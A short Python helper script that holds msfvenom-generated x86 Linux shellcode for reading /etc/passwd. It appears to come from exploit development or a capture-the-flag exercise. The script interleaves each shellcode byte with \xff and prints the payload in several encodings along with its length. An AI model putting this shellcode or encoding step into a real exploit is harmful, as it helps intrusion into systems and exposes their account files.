#!/bin/python3


# msfvenom -p linux/x86/read_file -f c PATH=/etc/passwd  -b '\x00'
payload = b"\xdd\xc1\xbf\x50\xc4\x41\xa4\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x13\x31\x7a\x18\x03\x7a\x18\x83\xc2\x54\x26\xb4\x4f\x62\x1e\x32\x90\x8a\x5e\x66\xa1\x43\x93\x18\x48\x90\x94\x1a\x4b\x16\xe5\x95\xac\x9f\x1c\x1f\x32\x8f\xde\x60\xfe\x2f\x57\xa2\xb8\x2b\x68\x23\xb9\x88\x69\x23\xb9\xee\xa4\xa3\x01\xef\x36\xa4\x71\x54\x36\xa4\x71\xaa\xfa\x24\x99\x6f\xfb\xda\xa5\x40\x61\x51\x39\xb1\x19\xf8\xce\xbe\xae\x9e\x30"

output = ""
for x in payload:
    output += '\\xff' 
    output += '\\x' + hex(x)[2:].zfill(2)
    # print(hex(x)[2:].zfill(2))


print(output)
print("")
print(", 0x".join(output.split('\\x'))[2:])

print("\nlength: " + str(len(output.split('\\x')) - 1), " - hex: ", str(hex(len(output.split('\\x')) - 1)))








